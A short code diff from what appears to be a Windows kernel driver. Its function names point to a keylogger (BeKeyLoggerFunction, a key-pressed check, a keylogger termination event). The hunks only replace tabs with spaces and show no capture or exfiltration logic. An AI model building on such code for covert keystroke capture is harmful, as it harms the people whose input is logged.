@@ -399,9 +399,9 @@ BeUpdateKeyStateMap(
 BOOLEAN
 BeWasKeyPressed(_In_ UINT8 Vk)
 {
-	BOOLEAN result = IS_KEY_DOWN(KeyRecentStateMap, Vk);
-	SET_KEY_DOWN(KeyRecentStateMap, Vk, FALSE);
-	return result;
+    BOOLEAN result = IS_KEY_DOWN(KeyRecentStateMap, Vk);
+    SET_KEY_DOWN(KeyRecentStateMap, Vk, FALSE);
+    return result;
 }
 
 /*
@@ -499,7 +499,7 @@ BeKeyLoggerFunction(_In_ PVOID StartContext)
             }
         }
     }
-		
+        
     if (BeGlobals::Shutdown)
     {
         KeSetEvent(&BeGlobals::hKeyLoggerTerminationEvent, IO_NO_INCREMENT, FALSE);
